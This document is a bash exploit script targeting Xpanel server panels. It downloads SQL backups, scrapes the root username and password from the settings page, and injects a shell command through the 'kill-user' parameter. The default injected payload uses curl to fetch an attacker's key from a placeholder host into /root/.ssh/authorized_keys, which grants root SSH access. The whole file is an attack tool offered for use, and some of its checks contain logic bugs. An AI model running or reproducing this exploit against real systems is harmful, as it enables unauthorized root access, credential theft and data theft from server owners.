#! /bin/bash

RED="\e[31m"
GREEN="\e[32m"
WHITE="\e[0m"


#payload url
payload="sudo+curl+-o+/root/.ssh/authorized_keys+-s+http://YOUR-SSH-PUBLIC-KEY-ADDRESS"

USAGE="Usage: ./xpanel.sh -t=IP:PORT -m=[1|2|3] [-h|--help] [-p|--payload] [-s|--silent]"
HELP="\nOPTION\n
        \t-t, --target\tTarget Xpanel IP and Port\n
        \t-m, --method\tWhat you want to do with that?\n
        \t-p, --payload\tSet a specefit payload to run in target shell \n
		\t\t\tdefault payload [$payload]\n
        \t-s, --silent\tOnly essential information will be print.\n
        \t-h, --help\tShow this help message\n
\nMETHODs\n
         \t1\tDump panel backups (.sql)\n
         \t2\tGet admin username and password\n
         \t3\tRun command on server\n
"

function p (){
  if [[ ! $SILENT ]];then
    if [[ $2 ]];then
      echo -e "["$GREEN"+"$WHITE"] $1" >&2
    else
      echo -e "["$RED"+"$WHITE"] $1" >&2
    fi
  fi
}

function dump (){
  links=$(curl -m 5 -s "$1:$2/Settings&sort=backup"  | egrep "/storage/backup/XPanel.*\.sql" --only-matching)
  count=0
  
  for i in $links;do
      count=$(($count+1))
      p $(echo $i | rev | cut -d '/' -f 1 | rev) 1
  done

  if [ $count ]  ;then
    p "Backup files not found." 0
    exit 1
  fi


  echo -en "["$GREEN"+"$WHITE"] Choose one item to download: "
  
  read NUM

  if [ $NUM -le $count ] && [ $NUM -ge 1 ];then
    count=1
    for i in $links;do
      if [ $NUM=$count ];then
        name=$(echo $i | rev | cut -d '/' -f 1 | rev)
        
        # Downloading file    
        wget "$1:$2/$i" -q -O "./$name"
      
        if [ ! $? ];then
          p "Download $name faild" 0
          exit 1
       
        else
          p $GREEN"$name"$WHITE" downloaded" 1
          exit 0
        fi
      
      fi
    done    
  else
    p "Choose a number between 1-$count" 0
    exit 1
  fi
}


function getpass(){
  ip=$1
  cred=$(curl -m 5 -s $1:$2/Settings  | egrep "(changhe_pass_root|user_root)\"" |sed -nr 's/.*value="(.+)" .*/\1/p')
  set -- $cred

  p "Successfully dumped." 1

  echo -e "[ "$GREEN"$ip"$WHITE" ] "$GREEN"$1"$WHITE":"$GREEN"$2"
}

function runcommand(){
	echo $payload
    code=$(curl -s -m 5 --output /dev/null --write-out %{http_code} "$1:$2/online&kill-user=x;$payload")
    port=$(curl -s -m 5 "$1:$2/Settings&sort=port" | egrep  "\"ssh_port\".*?value=\".+?\" " --only-matching | egrep "[0-9]+" --only-matching)

    p "Successfully sent." 1
    
    echo -e "["$GREEN"+"$WHITE"] root@$1:$port"
}


# proccess switches
for i in "$@"; do
  case $i in
    
    -s|--silent)
      SILENT=1
      ;;

    -h|--help)
      echo $USAGE
      echo -e $HELP
      exit 0
      ;;

    -t=*|--target=*)
      T="${i#*=}"
      TARGET=$(echo $T | cut -d ':' -f 1 )
      PORT=$(echo $T | cut -d ':' -f 2 )

      if ! [[ $TARGET =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
	      p "$TARGET is an invalid ip address" 0
	      exit 1
      fi
      if [ $PORT -lt 1 ] || [ $PORT -gt 65535 ]; then
	      p "Invalid port number (1-65535)" 0
        echo $USAGE
	      exit 1
	    fi

      CODE=$(curl -m 5 -s http://$1:$2  | grep -q  Xpanel)
      
      if [[ $CODE ]];then
        p "Host seems Down :(" 0
        exit 1
      fi


      ;;

    -m=*|--method=*)
      METHOD="${i#*=}"

      case $METHOD in
        "1"|"2"|"3");;
        *)
       	  p "Unknown method $METHOD" 0
	    echo $USAGE
	    exit 1
	      ;;
	    esac
    ;;

    -p=*|--payload=*)
      payload="${i#*=}"
      ;;

    -*|--*)
      p "Unknown option $i" 0
      echo $USAGE
      exit 1
      ;;
  esac
done


if [ ! -z $TARGET ] && [ ! -z $PORT ] && [ ! -z $METHOD ]; then
	
  p "Start attack ["$RED"$TARGET"$WHITE"]" 1
  
  case $METHOD in
		"1") dump $TARGET $PORT ;;
		"2") getpass $TARGET $PORT;;
		"3") runcommand $TARGET $PORT;;
	esac
  
  p "Finish attack" 1
  exit 0

else
	p "Insufficient parameters." 0
	echo $USAGE
	exit 1
fi
